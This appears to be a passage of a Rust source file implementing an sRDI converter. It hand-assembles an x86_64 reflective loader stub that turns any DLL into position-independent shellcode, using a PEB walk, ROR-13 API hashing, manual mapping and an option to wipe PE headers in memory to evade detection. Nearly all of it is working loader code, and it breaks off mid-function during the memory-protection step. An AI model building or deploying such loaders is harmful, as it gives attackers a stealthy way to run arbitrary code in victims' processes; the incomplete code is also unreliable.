//! sRDI converter — transforms a PE32+ DLL into position-independent x86_64
//! shellcode by generating a reflective loader stub and appending the raw DLL.
//!
//! # Shellcode layout
//!
//! ```text
//! ┌──────────────────────┐  offset 0
//! │  Reflective Loader   │  (position-independent x86_64 code)
//! │  Stub                │
//! ├──────────────────────┤  offset = stub_size
//! │  Original DLL bytes  │
//! └──────────────────────┘
//! ```
//!
//! The stub performs at runtime (on Windows x86_64):
//!
//! 1. PEB walk → find `kernel32.dll` base
//! 2. Export-table walk → resolve `LoadLibraryA`, `GetProcAddress`,
//!    `VirtualAlloc`, `VirtualProtect`
//! 3. `VirtualAlloc(SizeOfImage)`
//! 4. Copy PE headers + each section to correct VirtualAddress
//! 5. Apply base relocations (delta patching)
//! 6. Resolve import table (IAT fixup)
//! 7. Set per-section memory protection via `VirtualProtect`
//! 8. Optionally zero PE headers in memory
//! 9. Call `DllMain(DLL_PROCESS_ATTACH)`

use anyhow::{bail, Result};

use super::pe_parser::PeFile;

// ── Public types ────────────────────────────────────────────────────────────

/// Flags that control optional behaviour of the generated shellcode.
#[derive(Debug, Clone, Default)]
pub struct SrdiFlags {
    /// Zero out the PE header region after loading (hides MZ/PE signature in
    /// memory).
    pub clear_header: bool,
    /// Pass the shellcode base address as `lpReserved` to `DllMain` instead
    /// of `NULL`.
    pub pass_shellcode_base: bool,
}

impl SrdiFlags {
    fn to_u32(&self) -> u32 {
        let mut v = 0u32;
        if self.clear_header {
            v |= 1;
        }
        if self.pass_shellcode_base {
            v |= 2;
        }
        v
    }
}

// ── Hashing (ROR-13 — de-facto standard in shellcode) ───────────────────────

/// ROR-13 hash of an ASCII byte slice (for export function names).
pub(crate) fn ror13_hash(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    for &b in s {
        h = h.rotate_right(13);
        h = h.wrapping_add(b as u32);
    }
    h
}

/// ROR-13 hash of a UTF-16LE module name, uppercased.
///
/// Each ASCII byte produces *two* ROR-13 rounds: one for the character and one
/// for the implicit 0x00 high byte of the UTF-16LE encoding.
pub(crate) fn ror13_unicode_hash(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    for &b in s {
        let c = if b.is_ascii_lowercase() {
            b - 0x20
        } else {
            b
        };
        // Low byte of UTF-16LE
        h = h.rotate_right(13);
        h = h.wrapping_add(c as u32);
        // High byte of UTF-16LE (0x00 for ASCII)
        h = h.rotate_right(13);
        // adding 0 is a no-op but the rotate still happens
    }
    h
}

// Pre-computed hashes (verified in unit tests below).
const HASH_KERNEL32: u32 = ror13_unicode_hash_const(b"KERNEL32.DLL");
const HASH_LOADLIBRARYA: u32 = ror13_hash_const(b"LoadLibraryA");
const HASH_GETPROCADDRESS: u32 = ror13_hash_const(b"GetProcAddress");
const HASH_VIRTUALALLOC: u32 = ror13_hash_const(b"VirtualAlloc");
const HASH_VIRTUALPROTECT: u32 = ror13_hash_const(b"VirtualProtect");

const fn ror13_hash_const(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        h = (h >> 13) | (h << 19); // rotate_right(13)
        h = h.wrapping_add(s[i] as u32);
        i += 1;
    }
    h
}

const fn ror13_unicode_hash_const(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        let c = if s[i] >= b'a' && s[i] <= b'z' {
            s[i] - 0x20
        } else {
            s[i]
        };
        h = (h >> 13) | (h << 19);
        h = h.wrapping_add(c as u32);
        h = (h >> 13) | (h << 19);
        // high byte is 0, wrapping_add(0) is no-op
        i += 1;
    }
    h
}

// ── Minimal x86_64 byte emitter ─────────────────────────────────────────────

struct Asm {
    buf: Vec<u8>,
}

impl Asm {
    fn new() -> Self {
        Self {
            buf: Vec::with_capacity(1024),
        }
    }

    /// Current write position (= length of buf so far).
    #[inline]
    fn pos(&self) -> usize {
        self.buf.len()
    }

    /// Emit raw bytes.
    #[inline]
    fn emit(&mut self, bytes: &[u8]) {
        self.buf.extend_from_slice(bytes);
    }

    #[inline]
    fn emit8(&mut self, v: u8) {
        self.buf.push(v);
    }

    #[inline]
    fn emit32(&mut self, v: u32) {
        self.buf.extend_from_slice(&v.to_le_bytes());
    }

    /// Emit `0F 8x` conditional jump with 32-bit displacement placeholder.
    /// Returns the position of the rel32 field (for later patching).
    fn jcc32(&mut self, cc: u8) -> usize {
        self.emit8(0x0F);
        self.emit8(cc);
        let patch = self.pos();
        self.emit32(0);
        patch
    }

    /// Emit `E9` unconditional jump with 32-bit displacement placeholder.
    fn jmp32(&mut self) -> usize {
        self.emit8(0xE9);
        let patch = self.pos();
        self.emit32(0);
        patch
    }

    /// Emit `E8` call with 32-bit displacement placeholder.
    fn call32(&mut self) -> usize {
        self.emit8(0xE8);
        let patch = self.pos();
        self.emit32(0);
        patch
    }

    /// Patch a rel32 field at `at` so it jumps/calls to `target`.
    fn patch_rel32(&mut self, at: usize, target: usize) {
        let rel = (target as isize) - (at as isize) - 4;
        self.buf[at..at + 4].copy_from_slice(&(rel as i32).to_le_bytes());
    }

    /// Patch a rel8 field (single byte at `at`) for short jumps.
    fn patch_rel8(&mut self, at: usize, target: usize) {
        let rel = (target as isize) - (at as isize) - 1;
        assert!(
            (-128..=127).contains(&rel),
            "rel8 overflow: {rel} at {at} -> {target}"
        );
        self.buf[at] = rel as u8;
    }

    fn finish(self) -> Vec<u8> {
        self.buf
    }
}

// ── Stub builder ────────────────────────────────────────────────────────────

/// Build the complete x86_64 reflective loader stub.
///
/// `pe` is the parsed PE to be loaded.  The stub references PE metadata
/// (SizeOfImage, etc.) only through the appended DLL bytes at runtime.
///
/// After the stub, the caller appends the raw DLL bytes.  The returned stub
/// knows its own size so it can locate them.
fn build_stub(_pe: &PeFile, flags: &SrdiFlags) -> Vec<u8> {
    let mut a = Asm::new();
    let flags_u32 = flags.to_u32();

    // ── Prologue: save callee-saved registers ───────────────────────────────

    a.emit8(0x55); //  push rbp
    a.emit8(0x53); //  push rbx
    a.emit8(0x56); //  push rsi
    a.emit8(0x57); //  push rdi
    a.emit(&[0x41, 0x54]); //  push r12
    a.emit(&[0x41, 0x55]); //  push r13
    a.emit(&[0x41, 0x56]); //  push r14
    a.emit(&[0x41, 0x57]); //  push r15

    // Save RSP in RBX (RBX is now callee-saved, won't be touched by inner code)
    a.emit(&[0x48, 0x89, 0xE3]); //  mov rbx, rsp

    // Align RSP to 16 bytes
    a.emit(&[0x48, 0x83, 0xE4, 0xF0]); //  and rsp, -16

    // Allocate stack frame (0x90 = 144 bytes)
    // [rsp+0x00..0x1F] shadow space
    // [rsp+0x20] LoadLibraryA
    // [rsp+0x28] GetProcAddress
    // [rsp+0x30] VirtualAlloc
    // [rsp+0x38] VirtualProtect
    // [rsp+0x40] delta (base relocation)
    // [rsp+0x48] flags
    // [rsp+0x50] old_protect (VirtualProtect out param)
    // [rsp+0x58] section_headers_start
    // [rsp+0x60] number_of_sections
    // [rsp+0x68] temp (import descriptor ptr / section loop ptr)
    // [rsp+0x70] temp (INT ptr)
    // [rsp+0x78] temp (IAT ptr)
    // [rsp+0x80..0x8F] extra
    a.emit(&[0x48, 0x81, 0xEC, 0x90, 0x00, 0x00, 0x00]); // sub rsp, 0x90

    // ── Get position (call $+5 / pop rax) ───────────────────────────────────
    a.emit(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
    a.emit8(0x58); // pop rax
    // rax = address of this pop instruction
    let pop_rax_pos = a.pos() - 1; // position of pop instruction in stub

    // lea r12, [rax + OFFSET]  — OFFSET patched later (stub_size - pop_rax_pos)
    // Encoding: 4C 8D A0 <disp32>
    a.emit(&[0x4C, 0x8D, 0xA0]); // lea r12, [rax + disp32]
    let dll_offset_patch = a.pos();
    a.emit32(0); // placeholder — patched to (stub_size - pop_rax_pos)

    // Save shellcode base for pass_shellcode_base flag.
    // Shellcode base = rax - pop_rax_pos.  We compute it from rax.
    // sub rax, pop_rax_pos → rax = shellcode base
    // We save it on [rsp+0x80] in case the flag is set.
    a.emit(&[0x48, 0x2D]); // sub rax, imm32
    let sc_base_patch = a.pos();
    a.emit32(0); // placeholder — patched to pop_rax_pos
    // mov [rsp+0x80], rax  — save shellcode base
    a.emit(&[0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00]);

    // Store flags on stack
    // mov dword [rsp+0x48], flags_imm
    a.emit(&[0xC7, 0x44, 0x24, 0x48]);
    a.emit32(flags_u32);

    // ── PEB walk: find kernel32.dll base → R14 ──────────────────────────────

    // mov rax, gs:[0x60]  — TEB.ProcessEnvironmentBlock
    a.emit(&[0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00]);
    // mov rax, [rax+0x18] — PEB->Ldr
    a.emit(&[0x48, 0x8B, 0x40, 0x18]);
    // mov rsi, [rax+0x20] — Ldr->InMemoryOrderModuleList.Flink
    a.emit(&[0x48, 0x8B, 0x70, 0x20]);

    // .peb_loop:
    let peb_loop = a.pos();
    // movzx ecx, word [rsi+0x48] — BaseDllName.Length (bytes, UTF-16)
    a.emit(&[0x0F, 0xB7, 0x4E, 0x48]);
    // mov rdi, [rsi+0x50]        — BaseDllName.Buffer (PWSTR)
    a.emit(&[0x48, 0x8B, 0x7E, 0x50]);
    // xor eax, eax               — hash = 0
    a.emit(&[0x31, 0xC0]);
    // test ecx, ecx
    a.emit(&[0x85, 0xC9]);
    // jz .next_module
    a.emit8(0x74);
    let jz_next_mod = a.pos();
    a.emit8(0x00); // patch

    // .hash_module_char:
    let hash_mod_char = a.pos();
    // movzx edx, word [rdi]
    a.emit(&[0x0F, 0xB7, 0x17]);
    // add rdi, 2
    a.emit(&[0x48, 0x83, 0xC7, 0x02]);
    // cmp dl, 'a'
    a.emit(&[0x80, 0xFA, 0x61]);
    // jb .no_upper
    a.emit(&[0x72, 0x08]);
    // cmp dl, 'z'
    a.emit(&[0x80, 0xFA, 0x7A]);
    // ja .no_upper
    a.emit(&[0x77, 0x03]);
    // sub dl, 0x20
    a.emit(&[0x80, 0xEA, 0x20]);
    // .no_upper:
    // ror eax, 13
    a.emit(&[0xC1, 0xC8, 0x0D]);
    // add eax, edx
    a.emit(&[0x01, 0xD0]);
    // sub ecx, 2
    a.emit(&[0x83, 0xE9, 0x02]);
    // jnz .hash_module_char
    a.emit8(0x75);
    let jnz_hash_mod = a.pos();
    a.emit8(0x00);
    a.patch_rel8(jnz_hash_mod, hash_mod_char);

    // cmp eax, KERNEL32_HASH
    a.emit8(0x3D);
    a.emit32(HASH_KERNEL32);

    // je .found_kernel32
    let je_found_k32 = a.jcc32(0x84); // 0F 84 rel32

    // .next_module:
    let next_module = a.pos();
    // mov rsi, [rsi]   — Flink
    a.emit(&[0x48, 0x8B, 0x36]);
    // jmp .peb_loop
    let jmp_peb = a.jmp32();
    a.patch_rel32(jmp_peb, peb_loop);

    // .found_kernel32:
    let found_kernel32 = a.pos();
    // mov r14, [rsi+0x20]  — DllBase
    a.emit(&[0x4C, 0x8B, 0x76, 0x20]);

    // Patch forward jumps
    a.patch_rel8(jz_next_mod, next_module);
    a.patch_rel32(je_found_k32, found_kernel32);

    // ── Resolve 4 APIs from kernel32 via find_export subroutine ─────────────
    // find_export is placed at the end of the stub (after epilogue).
    // We emit call placeholders and patch them after emitting find_export.

    let mut find_export_calls: Vec<usize> = Vec::with_capacity(4);
    let api_hashes = [
        HASH_LOADLIBRARYA,
        HASH_GETPROCADDRESS,
        HASH_VIRTUALALLOC,
        HASH_VIRTUALPROTECT,
    ];

    for (i, &hash) in api_hashes.iter().enumerate() {
        // mov rcx, r14          — kernel32 base
        a.emit(&[0x4C, 0x89, 0xF1]); // mov rcx, r14
        // mov edx, hash_imm
        a.emit8(0xBA);
        a.emit32(hash);
        // call find_export
        let call_site = a.call32();
        find_export_calls.push(call_site);
        // mov [rsp + 0x20 + i*8], rax
        // Encoding: 48 89 44 24 <disp8>
        let disp = 0x20u8 + (i as u8) * 8;
        a.emit(&[0x48, 0x89, 0x44, 0x24, disp]);
    }

    // ── Parse the appended DLL's PE header ──────────────────────────────────
    // R12 points to the DLL data.

    // mov eax, [r12+0x3C]   — e_lfanew
    a.emit(&[0x41, 0x8B, 0x44, 0x24, 0x3C]);
    // lea r13, [r12+rax]    — r13 = PE header (in DLL data blob)
    // REX.WRB (4D), LEA(8D), ModR/M: mod:00 reg:101(r13) rm:100(SIB)
    // SIB: scale:00 index:000(rax) base:100(r12)
    a.emit(&[0x4E, 0x8D, 0x2C, 0x04]);
    // Correction: r13 as reg = REX.R, r12 as base = REX.B
    // REX = 0100 W(1) R(1) X(0) B(1) = 0x4D
    // ModR/M: mod:00 reg:101(r13.lo=5) rm:100(SIB) = 0x2C
    // SIB: scale:00 index:000(rax) base:100(r12.lo=4) = 0x04
    // Hmm wait, that's lea r13, [r12 + rax] which uses index rax and base r12.
    // REX: W=1, R=1(r13 hi), X=0(rax not ext), B=1(r12 ext) = 0x4D
    // Let me re-emit correctly:

    // Undo the 4 bytes just emitted
    a.buf.truncate(a.buf.len() - 4);
    // Correct encoding: 4D 8D 2C 04
    a.emit(&[0x4D, 0x8D, 0x2C, 0x04]);

    // Save section headers start and count
    // movzx eax, word [r13+0x14] — SizeOfOptionalHeader
    a.emit(&[0x41, 0x0F, 0xB7, 0x45, 0x14]);
    // lea rcx, [r13+0x18]        — start of optional header
    a.emit(&[0x49, 0x8D, 0x4D, 0x18]);
    // add rcx, rax               — section headers start = PE + 0x18 + SizeOfOptionalHeader
    a.emit(&[0x48, 0x01, 0xC1]);
    // mov [rsp+0x58], rcx
    a.emit(&[0x48, 0x89, 0x4C, 0x24, 0x58]);
    // movzx eax, word [r13+0x06] — NumberOfSections
    a.emit(&[0x41, 0x0F, 0xB7, 0x45, 0x06]);
    // mov [rsp+0x60], eax
    a.emit(&[0x89, 0x44, 0x24, 0x60]);

    // ── VirtualAlloc(NULL, SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_RW) ────

    // xor ecx, ecx            — lpAddress = NULL
    a.emit(&[0x31, 0xC9]);
    // mov edx, [r13+0x50]     — SizeOfImage
    a.emit(&[0x41, 0x8B, 0x55, 0x50]);
    // mov r8d, 0x3000          — MEM_COMMIT|MEM_RESERVE
    a.emit(&[0x41, 0xB8, 0x00, 0x30, 0x00, 0x00]);
    // mov r9d, 0x04            — PAGE_READWRITE
    a.emit(&[0x41, 0xB9, 0x04, 0x00, 0x00, 0x00]);
    // call [rsp+0x30]         — VirtualAlloc
    a.emit(&[0xFF, 0x54, 0x24, 0x30]);
    // test rax, rax
    a.emit(&[0x48, 0x85, 0xC0]);
    // jz .fail
    let jz_fail = a.jcc32(0x84);
    // mov rbp, rax             — rbp = allocated image base
    a.emit(&[0x48, 0x89, 0xC5]);

    // ── Copy PE headers ─────────────────────────────────────────────────────

    // mov ecx, [r13+0x54]     — SizeOfHeaders
    a.emit(&[0x41, 0x8B, 0x4D, 0x54]);
    // mov rsi, r12             — source = DLL data
    a.emit(&[0x4C, 0x89, 0xE6]);
    // mov rdi, rbp             — dest = allocated base
    a.emit(&[0x48, 0x89, 0xEF]);
    // rep movsb
    a.emit(&[0xF3, 0xA4]);

    // ── Copy sections ───────────────────────────────────────────────────────

    // mov ecx, [rsp+0x60]     — NumberOfSections
    a.emit(&[0x8B, 0x4C, 0x24, 0x60]);
    // mov rdx, [rsp+0x58]     — section headers start
    a.emit(&[0x48, 0x8B, 0x54, 0x24, 0x58]);

    // .copy_section_loop:
    let copy_sec_loop = a.pos();
    // test ecx, ecx
    a.emit(&[0x85, 0xC9]);
    // jz .sections_done
    let jz_sec_done = a.jcc32(0x84);

    // Save ecx (section count) and rdx (section header ptr)
    // mov [rsp+0x68], rdx
    a.emit(&[0x48, 0x89, 0x54, 0x24, 0x68]);
    // mov [rsp+0x70], ecx
    a.emit(&[0x89, 0x4C, 0x24, 0x70]);

    // mov ecx, [rdx+0x10]     — SizeOfRawData
    a.emit(&[0x8B, 0x4A, 0x10]);
    // test ecx, ecx
    a.emit(&[0x85, 0xC9]);
    // jz .next_section
    let jz_next_sec = a.jcc32(0x84);

    // mov eax, [rdx+0x14]     — PointerToRawData
    a.emit(&[0x8B, 0x42, 0x14]);
    // lea rsi, [r12+rax]       — source in DLL data
    // REX.WB(49) 8D 34 04 — actually:
    // lea rsi, [r12+rax]: REX: W=1, R=0, X=0, B=1(r12) = 0x49
    // ModR/M: mod:00 reg:110(rsi) rm:100(SIB) = 0x34
    // SIB: scale:00 index:000(rax) base:100(r12.lo) = 0x04
    a.emit(&[0x49, 0x8D, 0x34, 0x04]);

    // mov eax, [rdx+0x0C]     — VirtualAddress
    a.emit(&[0x8B, 0x42, 0x0C]);
    // lea rdi, [rbp+rax]       — dest in allocated image
    // REX.W(48), LEA(8D), ModR/M: mod:00 reg:111(rdi) rm:100(SIB) = 0x3C
    // SIB: scale:00 index:000(rax) base:101(rbp) = 0x05
    a.emit(&[0x48, 0x8D, 0x3C, 0x05]);
    // Wait: SIB with base=101 and mod=00 means [disp32 + rax*1], not [rbp+rax].
    // Need mod=00 and using RBP as base requires SIB with mod=01 (disp8=0).
    // Fix: use mod:01 disp8=0
    a.buf.truncate(a.buf.len() - 4);
    // lea rdi, [rbp+rax+0]
    // ModR/M: mod:01 reg:111(rdi) rm:100(SIB) = 0x7C
    // SIB: scale:00 index:000(rax) base:101(rbp) = 0x05
    // disp8: 0x00
    a.emit(&[0x48, 0x8D, 0x7C, 0x05, 0x00]);

    // rep movsb
    a.emit(&[0xF3, 0xA4]);

    // .next_section:
    let next_section = a.pos();
    // Restore
    // mov rdx, [rsp+0x68]
    a.emit(&[0x48, 0x8B, 0x54, 0x24, 0x68]);
    // mov ecx, [rsp+0x70]
    a.emit(&[0x8B, 0x4C, 0x24, 0x70]);
    // add rdx, 40              — next section header (0x28 = 40)
    a.emit(&[0x48, 0x83, 0xC2, 0x28]);
    // dec ecx
    a.emit(&[0xFF, 0xC9]);
    // jmp .copy_section_loop
    let jmp_copy_sec = a.jmp32();
    a.patch_rel32(jmp_copy_sec, copy_sec_loop);

    // Patch forward jump
    let sections_done = a.pos();
    a.patch_rel32(jz_sec_done, sections_done);
    a.patch_rel32(jz_next_sec, next_section);

    // ── Apply base relocations ──────────────────────────────────────────────
    // delta = rbp (allocated base) - ImageBase (from PE optional header)

    // mov rcx, [r13+0x30]      — ImageBase (QWORD at PE+0x18+0x18 = PE+0x30)
    a.emit(&[0x49, 0x8B, 0x4D, 0x30]);
    // mov rax, rbp
    a.emit(&[0x48, 0x89, 0xE8]);
    // sub rax, rcx              — delta
    a.emit(&[0x48, 0x29, 0xC8]);
    // mov [rsp+0x40], rax       — save delta
    a.emit(&[0x48, 0x89, 0x44, 0x24, 0x40]);
    // test rax, rax
    a.emit(&[0x48, 0x85, 0xC0]);
    // jz .relocs_done
    let jz_relocs_done = a.jcc32(0x84);

    // Relocation directory: data_dir[5]
    // data_dir starts at PE + 0x88 (PE + 0x18 optional_hdr_start + 0x70 data_dir_offset)
    // dir[5] = PE + 0x88 + 5*8 = PE + 0xB0
    // mov eax, [r13+0xB0]      — reloc dir RVA
    a.emit(&[0x41, 0x8B, 0x85, 0xB0, 0x00, 0x00, 0x00]);
    // test eax, eax
    a.emit(&[0x85, 0xC0]);
    // jz .relocs_done
    let jz_relocs_done2 = a.jcc32(0x84);

    // add rax, rbp              — rax = reloc dir in allocated image
    a.emit(&[0x48, 0x01, 0xE8]);
    // mov rdx, rax              — rdx = current block pointer
    a.emit(&[0x48, 0x89, 0xC2]);
    // mov ecx, [r13+0xB4]      — reloc dir Size
    a.emit(&[0x41, 0x8B, 0x8D, 0xB4, 0x00, 0x00, 0x00]);
    // add rcx, rdx              — rcx = end of reloc data
    a.emit(&[0x48, 0x01, 0xD1]);

    // .reloc_block:
    let reloc_block = a.pos();
    // cmp rdx, rcx
    a.emit(&[0x48, 0x39, 0xCA]);
    // jae .relocs_done
    let jae_relocs_done = a.jcc32(0x83);

    // mov r8d, [rdx]            — PageRVA
    a.emit(&[0x44, 0x8B, 0x02]);
    // mov r9d, [rdx+4]          — BlockSize
    a.emit(&[0x44, 0x8B, 0x4A, 0x04]);
    // cmp r9d, 8                — minimum valid block
    a.emit(&[0x41, 0x83, 0xF9, 0x08]);
    // jb .relocs_done
    let jb_relocs_done = a.jcc32(0x82);

    // lea r10, [rdx+8]          — first entry
    a.emit(&[0x4C, 0x8D, 0x52, 0x08]);
    // mov eax, r9d              — zero-extend BlockSize to rax
    a.emit(&[0x44, 0x89, 0xC8]);
    // lea r11, [rdx+rax]        — end of block
    // REX: W=1, R=1(r11), X=0, B=0 = 0x4C
    // ModR/M: mod:00 reg:011(r11.lo=3) rm:100(SIB) = 0x1C
    // SIB: scale:00 index:000(rax) base:010(rdx) = 0x02
    a.emit(&[0x4C, 0x8D, 0x1C, 0x02]);

    // Save rcx (end of reloc data) on stack
    a.emit(&[0x48, 0x89, 0x4C, 0x24, 0x68]); // mov [rsp+0x68], rcx

    // .reloc_entry:
    let reloc_entry = a.pos();
    // cmp r10, r11
    a.emit(&[0x4D, 0x39, 0xDA]);
    // jae .next_reloc_block
    let jae_next_block = a.jcc32(0x83);

    // movzx eax, word [r10]     — reloc entry (type:4 | offset:12)
    a.emit(&[0x41, 0x0F, 0xB7, 0x02]);
    // mov edi, eax
    a.emit(&[0x89, 0xC7]);
    // shr edi, 12               — type
    a.emit(&[0xC1, 0xEF, 0x0C]);
    // and eax, 0xFFF            — offset
    a.emit(&[0x25, 0xFF, 0x0F, 0x00, 0x00]);
    // cmp edi, 10               — IMAGE_REL_BASED_DIR64
    a.emit(&[0x83, 0xFF, 0x0A]);
    // jne .skip_reloc
    a.emit8(0x75);
    let jne_skip_reloc = a.pos();
    a.emit8(0x00);

    // add eax, r8d              — page_rva + offset
    a.emit(&[0x44, 0x01, 0xC0]);
    // lea rdi, [rbp+rax+0]      — target address in allocated image
    // rbp as base with SIB needs mod:01 disp8=0
    a.emit(&[0x48, 0x8D, 0x7C, 0x05, 0x00]);
    // mov rsi, [rsp+0x40]       — delta
    a.emit(&[0x48, 0x8B, 0x74, 0x24, 0x40]);
    // add [rdi], rsi             — *(u64*)target += delta
    a.emit(&[0x48, 0x01, 0x37]);

    // .skip_reloc:
    let skip_reloc = a.pos();
    a.patch_rel8(jne_skip_reloc, skip_reloc);
    // add r10, 2                 — next entry (2 bytes each)
    a.emit(&[0x49, 0x83, 0xC2, 0x02]);
    // jmp .reloc_entry
    let jmp_reloc_entry = a.jmp32();
    a.patch_rel32(jmp_reloc_entry, reloc_entry);

    // .next_reloc_block:
    let next_reloc_block = a.pos();
    a.patch_rel32(jae_next_block, next_reloc_block);
    // mov rdx, r11               — advance to next block
    a.emit(&[0x4C, 0x89, 0xDA]);
    // mov rcx, [rsp+0x68]        — restore end-of-reloc-data
    a.emit(&[0x48, 0x8B, 0x4C, 0x24, 0x68]);
    // jmp .reloc_block
    let jmp_reloc_block = a.jmp32();
    a.patch_rel32(jmp_reloc_block, reloc_block);

    // .relocs_done:
    let relocs_done = a.pos();
    a.patch_rel32(jz_relocs_done, relocs_done);
    a.patch_rel32(jz_relocs_done2, relocs_done);
    a.patch_rel32(jae_relocs_done, relocs_done);
    a.patch_rel32(jb_relocs_done, relocs_done);

    // ── Resolve import table ────────────────────────────────────────────────
    // Import directory: data_dir[1] at PE + 0x88 + 1*8 = PE + 0x90

    // mov eax, [r13+0x90]       — import dir RVA
    a.emit(&[0x41, 0x8B, 0x85, 0x90, 0x00, 0x00, 0x00]);
    // test eax, eax
    a.emit(&[0x85, 0xC0]);
    // jz .imports_done
    let jz_imports_done = a.jcc32(0x84);
    // add rax, rbp               — import dir in allocated image
    a.emit(&[0x48, 0x01, 0xE8]);

    // .import_dll_loop:
    let import_dll_loop = a.pos();
    // mov ecx, [rax+0x0C]       — Name RVA
    a.emit(&[0x8B, 0x48, 0x0C]);
    // test ecx, ecx
    a.emit(&[0x85, 0xC9]);
    // jz .imports_done
    let jz_imports_done2 = a.jcc32(0x84);

    // Save import descriptor ptr
    // mov [rsp+0x68], rax
    a.emit(&[0x48, 0x89, 0x44, 0x24, 0x68]);

    // LoadLibraryA(base + name_rva)
    // lea rcx, [rbp+rcx+0]     — DLL name string (rbp as base needs mod:01)
    // Actually: add rcx, rbp is simpler
    a.emit(&[0x48, 0x01, 0xE9]); // add rcx, rbp
    // call [rsp+0x20]           — LoadLibraryA
    a.emit(&[0xFF, 0x54, 0x24, 0x20]);
    // test rax, rax
    a.emit(&[0x48, 0x85, 0xC0]);
    // jz .import_next
    let jz_import_next = a.jcc32(0x84);
    // mov r14, rax               — loaded DLL handle
    a.emit(&[0x49, 0x89, 0xC6]);

    // Restore import descriptor
    // mov rax, [rsp+0x68]
    a.emit(&[0x48, 0x8B, 0x44, 0x24, 0x68]);
    // mov ecx, [rax]             — OriginalFirstThunk
    a.emit(&[0x8B, 0x08]);
    // test ecx, ecx
    a.emit(&[0x85, 0xC9]);
    // jnz .use_oft
    a.emit8(0x75);
    let jnz_use_oft = a.pos();
    a.emit8(0x00);
    // mov ecx, [rax+0x10]       — FirstThunk (fallback)
    a.emit(&[0x8B, 0x48, 0x10]);
    // .use_oft:
    let use_oft = a.pos();
    a.patch_rel8(jnz_use_oft, use_oft);
    // add rcx, rbp               — INT absolute
    a.emit(&[0x48, 0x01, 0xE9]);

    // mov edx, [rax+0x10]       — FirstThunk RVA
    a.emit(&[0x8B, 0x50, 0x10]);
    // add rdx, rbp               — IAT absolute
    a.emit(&[0x48, 0x01, 0xEA]);

    // .import_thunk_loop:
    let import_thunk_loop = a.pos();
    // mov r8, [rcx]              — thunk value (64-bit)
    a.emit(&[0x4C, 0x8B, 0x01]);
    // test r8, r8
    a.emit(&[0x4D, 0x85, 0xC0]);
    // jz .import_next
    let jz_import_next2 = a.jcc32(0x84);

    // Save INT & IAT pointers
    // mov [rsp+0x70], rcx
    a.emit(&[0x48, 0x89, 0x4C, 0x24, 0x70]);
    // mov [rsp+0x78], rdx
    a.emit(&[0x48, 0x89, 0x54, 0x24, 0x78]);

    // Check ordinal bit (bit 63 of r8)
    // test r8, r8
    a.emit(&[0x4D, 0x85, 0xC0]);
    // js .ordinal_import
    let js_ordinal = a.jcc32(0x88);

    // Name import: r8 = RVA of IMAGE_IMPORT_BY_NAME
    // add r8, rbp               — absolute
    a.emit(&[0x49, 0x01, 0xE8]);
    // lea rdx, [r8+2]           — skip Hint (WORD) to get name
    a.emit(&[0x49, 0x8D, 0x50, 0x02]);
    // mov rcx, r14               — DLL handle
    a.emit(&[0x4C, 0x89, 0xF1]);
    // call [rsp+0x28]           — GetProcAddress
    a.emit(&[0xFF, 0x54, 0x24, 0x28]);
    // jmp .store_import
    let jmp_store = a.jmp32();

    // .ordinal_import:
    let ordinal_import = a.pos();
    a.patch_rel32(js_ordinal, ordinal_import);
    // movzx edx, r8w             — ordinal (low 16 bits)
    a.emit(&[0x41, 0x0F, 0xB7, 0xD0]);
    // mov rcx, r14               — DLL handle
    a.emit(&[0x4C, 0x89, 0xF1]);
    // call [rsp+0x28]           — GetProcAddress
    a.emit(&[0xFF, 0x54, 0x24, 0x28]);

    // .store_import:
    let store_import = a.pos();
    a.patch_rel32(jmp_store, store_import);
    // mov rdx, [rsp+0x78]       — IAT pointer
    a.emit(&[0x48, 0x8B, 0x54, 0x24, 0x78]);
    // mov [rdx], rax             — write function address to IAT
    a.emit(&[0x48, 0x89, 0x02]);
    // mov rcx, [rsp+0x70]       — INT pointer
    a.emit(&[0x48, 0x8B, 0x4C, 0x24, 0x70]);
    // add rcx, 8                 — next thunk
    a.emit(&[0x48, 0x83, 0xC1, 0x08]);
    // add rdx, 8                 — next IAT entry
    a.emit(&[0x48, 0x83, 0xC2, 0x08]);
    // jmp .import_thunk_loop
    let jmp_thunk = a.jmp32();
    a.patch_rel32(jmp_thunk, import_thunk_loop);

    // .import_next:
    let import_next = a.pos();
    a.patch_rel32(jz_import_next, import_next);
    a.patch_rel32(jz_import_next2, import_next);
    // mov rax, [rsp+0x68]       — import descriptor
    a.emit(&[0x48, 0x8B, 0x44, 0x24, 0x68]);
    // add rax, 20                — next descriptor (20 bytes)
    a.emit(&[0x48, 0x83, 0xC0, 0x14]);
    // jmp .import_dll_loop
    let jmp_imp_dll = a.jmp32();
    a.patch_rel32(jmp_imp_dll, import_dll_loop);

    // .imports_done:
    let imports_done = a.pos();
    a.patch_rel32(jz_imports_done, imports_done);
    a.patch_rel32(jz_imports_done2, imports_done);

    // ── Set per-section memory protection (VirtualProtect) ──────────────────

    // mov ecx, [rsp+0x60]       — NumberOfSections
    a.emit(&[0x8B, 0x4C, 0x24, 0x60]);
    // mov rdx, [rsp+0x58]       — section headers start (in DLL data blob)
    a.emit(&[0x48, 0x8B, 0x54, 0x24, 0x58]);

    // .prot_section_loop:
    let prot_sec_loop = a.pos();
    // test ecx, ecx
    a.emit(&[0x85, 0xC9]);
    // jz .prot_done
    let jz_prot_done = a.jcc32(0x84);

    // Save counter and ptr
    a.emit(&[0x48, 0x89, 0x54, 0x24, 0x68]); // mov [rsp+0x68], rdx
    a.emit(&[0x89, 0x4C, 0x24, 0x70]); // mov [rsp+0x70], ecx

    // Compute protection from characteristics
    // mov eax, [rdx+0x24]       — Characteristics
    a.emit(&[0x8B, 0x42, 0x24]);

    // Extract W(bit31), R(bit30), X(bit29) → bits 2,1,0
    // shr eax, 29
    a.emit(&[0xC1, 0xE8, 0x1D]);
    // and eax, 7
    a.emit(&[0x83, 0xE0, 0x07]);

    // Compute protection value:
    // Index = bits W|R|X: 0=NOACCESS(01), 1=X(10), 2=R(02), 3=XR(20),
    //                     4=W(04), 5=XW(40), 6=RW(04), 7=XRW(40)
    // mov r8d, 0x04             — default PAGE_READWRITE
